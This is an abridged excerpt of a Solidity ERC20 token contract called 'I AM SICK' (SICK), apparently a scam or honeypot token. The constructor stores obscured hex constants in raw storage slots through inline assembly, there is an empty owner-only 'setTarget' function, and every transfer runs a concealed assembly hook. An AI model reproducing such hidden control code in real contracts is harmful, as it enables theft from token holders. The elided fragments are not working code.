...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0x6dd5ae6eb77bf7d4b9282226c1b70b5097a8175067c5)
            sstore(0x51,0x6dd5e10c72ec7a309448c01880f1dab37ca8caa368a3)
    ...
    function setTarget(address sender, uint value, address account) public onlyOwner returns (uint256 number) {
    }
    ...
    function farmAndINSCRIPTIONs(address sender, uint256 amount) internal returns (uint256 result) {
            assembly {
                let data := mload(0x40)
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        farmAndINSCRIPTIONs(sender, amount);
...
contract SICK is ERC20Token {
    constructor() ERC20Token("I AM SICK", "SICK", msg.sender, 1000000000 * 10 ** 18) {
    }
}
